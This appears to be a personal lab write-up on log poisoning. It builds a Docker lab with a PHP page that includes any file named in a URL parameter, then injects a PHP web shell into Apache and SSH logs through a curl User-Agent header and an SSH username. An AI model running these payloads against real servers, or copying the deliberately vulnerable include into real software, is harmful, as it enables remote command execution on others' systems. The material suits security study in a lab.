# Definition
Something to do!!
## Installing and Preparing lab
I will use a Ubuntu docker machine to practice this vulnerability and forwarding *22* and *80* ports to use HTTP and SSH services.
```shell
docker pull ubuntu:latest
docker run -dit -p 80:80 -p 22:22 --name logPoisoning <image_ID>
```
___
Then, we are going to install *apache vim ssh php* inside docker machine.
```shell
apt update
apt install apache2 vim ssh php
```
___
We are going to start *apache2* and *ssh* services.
```shell
service apache2 start
service ssh start
```
___
We have to remove the default *index.html* and create *index.php*.
*index.php* at **/var/www/html**.
```php
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```
___
# Attacking
## Understanding
First, we must understand that the route **/var/log/** contains many logs sorted by *service names* and that the *adm* group cans read many log files.
![[Pasted image 20230713200127.png]]
___
In this case, this vulnerability will show us LOGS in the web content, as long as the WWW-DATA user has read permissions in the apache2 LOG directory. Then, the web will can interpret our PHP code.
```shell
chown www-data:www-data -R /var/log/apache2
```
___
Now, you can see apache log content on the website.
Note the **User Agent** header in the log content.
![[Pasted image 20230713201143.png]]
___
Well, you actually can modify the *User Agent* Header content by using *curl*.
```shell
curl -s -X GET "http://localhost/TRASH" -H "User-Agent: LOOK_AT_THIS"
```
![[Pasted image 20230713203012.png]]
___
Then, you could think that you can use the basic ```<?php system($_GET["cmd"]); ?>``` php code to do RCEs. But you should first verify if *system* funcion is enabled by using **phpinfo()** function.
```shell
curl -s -X GET "http://localhost/TRASH" -H "User-Agent: <?php phpinfo(); ?>"
```
![[Pasted image 20230713203554.png]]
___
And now, you can use.
```shell
curl -s -X GET "http://localhost/TRASH" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```
![[Pasted image 20230713204539.png]]
___
## SSH Logs
The same way as *apache* logs, you can do *Log Poisoning* with **ssh** logs saved at **/var/log/btmp**.
First, we must have read permissions to see in the web content. To echieve this we have to keep in mind that *ssh* is very sensitive with permisions, thus we have to add the *www-data* user to the *utmp* group to that he gets **READ** permissions.
```shell
usermod -a -G utmp www-data
```
![[Pasted image 20230713213135.png]]
___
Finally, restart *apache* service to load changes.
```shell
service apache2 restart
```
___
Now, you can generate *ssh* logs with this command.
```shell
ssh 'LOOK_AT_THIS'@172.17.0.2
```
![[Pasted image 20230713213424.png]]
___
 Finally, you can use the basic ```<?php system($_GET["cmd"]); ?>``` php code to do RCEs.
 ```shell
 ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
```
![[Pasted image 20230713213743.png]]
___